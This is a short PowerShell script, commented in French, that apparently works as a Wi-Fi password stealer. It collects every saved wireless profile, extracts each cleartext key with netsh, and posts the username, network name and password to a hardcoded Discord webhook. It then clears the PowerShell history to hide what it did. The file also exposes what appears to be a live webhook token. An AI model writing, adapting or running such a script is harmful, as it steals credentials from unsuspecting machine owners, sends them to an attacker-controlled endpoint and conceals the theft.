# URL du webhook Discord
$discord = 'https://discord.com/api/webhooks/1280938491231862825/AOmwFnNFIHX-dOKbcx2HVV7B5EN3PJfe8bH3Gt7xa-oRgHnCzx5ZA1ii7OZsDtvbITRw'

Write-Output "Début du script PowerShell"
Write-Output "Webhook Discord : $discord"

# Récupération des profils Wi-Fi enregistrés
Write-Output "Tentative de récupération des profils Wi-Fi..."
$profiles = netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+'

# Vérification du nombre de profils
if ($profiles.Count -eq 0) {
    Write-Output "Aucun profil Wi-Fi trouvé."
} else {
    Write-Output "Profils Wi-Fi trouvés :"
    foreach ($profile in $profiles) {
        Write-Output $profile.Matches.Value
    }
}

# Parcours de chaque profil pour récupérer les mots de passe
foreach ($profile in $profiles) {
    $wlan = $profile.Matches.Value
    Write-Output "Traitement du profil Wi-Fi : $wlan"

    # Récupération du mot de passe Wi-Fi pour le profil courant
    $output = netsh wlan show profile $wlan key=clear
    $passw = ($output | Select-String 'Key Content\s+:\s(.+)').Matches.Value -replace 'Key Content\s+:\s', ''

    # Si aucun mot de passe n'est trouvé
    if ([string]::IsNullOrWhiteSpace($passw)) {
        Write-Output "Aucun mot de passe trouvé pour $wlan"
    } else {
        Write-Output "Mot de passe trouvé pour $wlan : $passw"
    }

    # Préparation du corps du message à envoyer à Discord
    $Body = @{
        'username' = $env:username + " | " + [string]$wlan
        'content' = [string]$passw
    }
    Write-Output "Données à envoyer pour $wlan :"
    Write-Output $Body

    # Envoi des données à Discord
    Write-Output "Envoi des données au webhook Discord..."
    try {
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $discord -Method Post -Body ($Body | ConvertTo-Json)
        Write-Output "Données envoyées avec succès pour $wlan"
    } catch {
        Write-Output "Erreur lors de l'envoi des données pour $wlan : $_"
    }
}

# Effacement de l'historique PowerShell
Write-Output "Effacement de l'historique PowerShell"
Clear-History

Write-Output "Script terminé"
